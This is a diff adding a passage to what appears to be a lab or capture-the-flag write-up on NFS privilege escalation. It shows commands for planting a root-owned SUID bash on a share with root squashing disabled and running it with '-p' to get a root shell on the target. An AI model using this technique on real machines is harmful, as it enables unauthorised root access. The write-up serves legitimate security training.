@@ -41,3 +41,50 @@ If you have a low privilege shell on any machine and you found that a machine ha
 
 By default, on NFS shares- **Root Squashing** is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.
 
+To prepare we navigate to the mounted folder on our attacker machine : 
+
+```bash
+/tmp/mount🔒 
+❯ cd user/
+```
+
+We begin by copying over the bash executable to our attacker machine from the victim machine in order to ensure compatibility using : 
+
+```bash
+❯ scp -i /path/to/id_rsa user@10.10.83.29:/bin/bash ~/Downloads/bash
+```
+
+We then copy it into the mounted folder : 
+
+```bash
+tmp/mount/user 
+❯ cp ~/Downloads/bash .
+```
+
+We then provide the bash executable to be owned by a root user and possess the SUID bit : 
+
+```bash
+❯ sudo chown root ./bash
+
+❯ sudo chmod +s bash
+```
+
+The permissions should read as follows : 
+
+```bash
+/tmp/mount/cappucino 
+❯ ls -al
+total 1124
+drwxr-xr-x 5 kali kali    4096 Jan 21 11:06 ./
+drwxr-xr-x 3 root root    4096 Apr 22  2020 ../
+-rwsr-sr-x 1 root kali 1113504 Jan 21 11:06 bash*
+```
+
+We then SSH into the user and run our malicious bash executable with the `-p` flag to maintain permissions to obtain a `root` shell : 
+
+```bash
+user@10.10.83.29:~$ ./bash -p
+```
+
+
+
